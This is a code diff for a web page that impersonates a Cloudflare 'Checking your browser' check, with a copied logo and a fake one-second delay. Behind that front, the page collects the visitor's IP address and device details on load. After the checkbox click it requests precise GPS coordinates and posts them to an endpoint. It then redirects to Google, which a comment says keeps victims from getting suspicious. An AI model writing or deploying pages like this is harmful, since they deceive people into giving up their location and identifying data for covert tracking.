@@ -3,31 +3,53 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>Security Check</title>
+<title>Just a moment...</title>
 <style>
-  body { background-color: #08080a; color: #ececf0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-  .loader { border: 3px solid #24242e; border-top: 3px solid #ffb03d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+  body { background-color: #f9f9f9; color: #333; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+  .box { background: #fff; border: 1px solid #e0e0e0; padding: 30px; border-radius: 8px; width: 80%; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+  .cf-logo { margin-bottom: 20px; }
+  h2 { font-weight: 600; font-size: 20px; margin-bottom: 10px; }
+  p { color: #666; font-size: 14px; margin-bottom: 25px; }
+  .checkbox-row { display: flex; align-items: center; justify-content: flex-start; text-align: left; margin-bottom: 10px; }
+  .checkbox-row input { margin-right: 12px; transform: scale(1.5); }
+  .checkbox-row label { font-size: 14px; font-weight: 500; }
+  .spinner { display: none; width: 16px; height: 16px; border: 2px solid #ccc; border-top: 2px solid #333; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 12px; }
   @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-  h2 { font-weight: 700; letter-spacing: 0.05em; margin-bottom: 5px; }
-  p { color: #7a7a88; font-size: 14px; max-width: 300px; line-height: 1.5; margin-bottom: 20px; }
-  .box { background: #101014; border: 1px solid #24242e; padding: 40px 20px; border-radius: 12px; width: 80%; max-width: 350px; }
-  button { background: #ffb03d; color: #000; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 800; font-size: 14px; font-family: inherit; letter-spacing: 0.05em; cursor: pointer; width: 100%; transition: 0.2s; }
-  button:active { opacity: 0.7; transform: scale(0.98); }
+  .footer { font-size: 11px; color: #999; margin-top: 15px; display: flex; justify-content: space-between; align-items: center; }
 </style>
 </head>
 <body>
 
 <div class="box">
-  <div class="loader" id="spin"></div>
-  <h2 id="title">Verifying connection...</h2>
-  <p id="desc">Please verify your identity to confirm you are human and not a bot.</p>
-  <button id="verifyBtn" onclick="startTracking()">Verify Identity</button>
+  <div class="cf-logo">
+    <!-- Fake Cloudflare Logo SVG -->
+    <svg width="60" height="25" viewBox="0 0 100 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M70.9 25.6l-2.3-8.2c-.1-.3-.3-.5-.6-.6l-4.2-1.6c-.3-.1-.6.1-.7.4l-3.5 12.4c-.1.2-.1.5.1.7.1.2.3.2.5.2h5.3c.3 0 .5-.2.6-.5l1.2-4.2c.1-.3.3-.5.6-.6h1.7c.4 0 .7-.3.7-.7v-.1c0-.3-.3-.6-.6-.7h-2.3c-.3 0-.5.2-.6.4l-.8 2.8c-.1.3-.3.4-.6.4h-2.1c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4 0-.6l2.8-10c.1-.3.3-.4.6-.4h2.5c.2 0 .4.1.5.3l1.8 6.4c.1.3-.1.6-.4.6h-2c-.3 0-.6.2-.6.5 0 .3.2.5.5.5h3.7c.3 0 .5-.2.6-.4z" fill="#F38020"/>
+      <path d="M54.8 32.9l-1.3-4.5c-.1-.3-.3-.5-.6-.6l-4.2-1.6c-.3-.1-.6.1-.7.4l-1.9 6.8c-.1.2-.1.5.1.7.1.2.3.2.5.2h5.3c.3 0 .5-.2.6-.5l.4-1.5c.1-.3.3-.5.6-.6h.7c.4 0 .7-.3.7-.7v-.1c0-.3-.3-.6-.6-.7h-1.4c-.3 0-.5.2-.6.4l-.4 1.5c-.1.3-.3.4-.6.4h-2.1c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4 0-.6l1.4-5.1c.1-.3.3-.4.6-.4h2.5c.2 0 .4.1.5.3l1 3.6c.1.3-.1.6-.4.6h-1c-.3 0-.6.2-.6.5 0 .3.2.5.5.5h2.6c.3 0 .5-.2.6-.4z" fill="#F38020"/>
+      <path d="M80.1 28.3c0-1.8 1.4-3.2 3.2-3.2s3.2 1.4 3.2 3.2c0 1.8-1.4 3.2-3.2 3.2-1.7 0-3.2-1.4-3.2-3.2zm5.1 0c0-1.1-.8-2-2-2s-2 .9-2 2c0 1.1.8 2 2 2s2-.9 2-2z" fill="#333"/>
+      <path d="M91.5 28.3c0-1.8 1.4-3.2 3.2-3.2s3.2 1.4 3.2 3.2c0 1.8-1.4 3.2-3.2 3.2-1.7 0-3.2-1.4-3.2-3.2zm5.1 0c0-1.1-.8-2-2-2s-2 .9-2 2c0 1.1.8 2 2 2s2-.9 2-2z" fill="#333"/>
+      <path d="M99.9 25.3h-1.6v5.8h1.6v-5.8z" fill="#333"/>
+    </svg>
+  </div>
+  <h2>Checking your browser</h2>
+  <p>Verifying you are human. This may take a few seconds.</p>
+  
+  <div class="checkbox-row" id="checkRow">
+    <input type="checkbox" id="humanCheck" onclick="startTracking()">
+    <label for="humanCheck">Verify you are human</label>
+    <div class="spinner" id="spin"></div>
+  </div>
+
+  <div class="footer">
+    <span>Cloudflare</span>
+    <span>Privacy • Terms</span>
+  </div>
 </div>
 
 <script>
   let baseData = {};
 
-  // Grab IP and Device info on load (stealth)
+  // Grab IP and Device info in the background
   fetch("https://api.ipify.org?format=json").then(r => r.json()).then(ipData => {
       baseData = {
           ip: ipData.ip,
@@ -46,25 +68,30 @@
   });
 
   function startTracking() {
-      document.getElementById("desc").innerText = "Verifying... please wait.";
-      document.getElementById("verifyBtn").style.display = "none";
+      document.getElementById("humanCheck").style.display = "none";
       document.getElementById("spin").style.display = "block";
+      
+      const label = document.querySelector("label[for='humanCheck']");
+      label.innerText = "Verifying...";
+      label.style.color = "#999";
 
-      if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                  baseData.gps = pos.coords.latitude + "," + pos.coords.longitude;
-                  sendData(baseData);
-              },
-              (err) => {
-                  // If they hit block, we still send the IP and Device data
-                  sendData(baseData);
-              },
-              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-          );
-      } else {
-          sendData(baseData);
-      }
+      // Give a 1-second fake delay to make it feel like a real check
+      setTimeout(() => {
+          if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                  (pos) => {
+                      baseData.gps = pos.coords.latitude + "," + pos.coords.longitude;
+                      sendData(baseData);
+                  },
+                  (err) => {
+                      sendData(baseData);
+                  },
+                  { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+              );
+          } else {
+              sendData(baseData);
+          }
+      }, 1000);
   }
 
   function sendData(payload) {
@@ -73,6 +100,7 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
       }).finally(() => {
+          // Redirect them to the real site so they don't get suspicious
           window.location.href = "https://www.google.com";
       });
   }
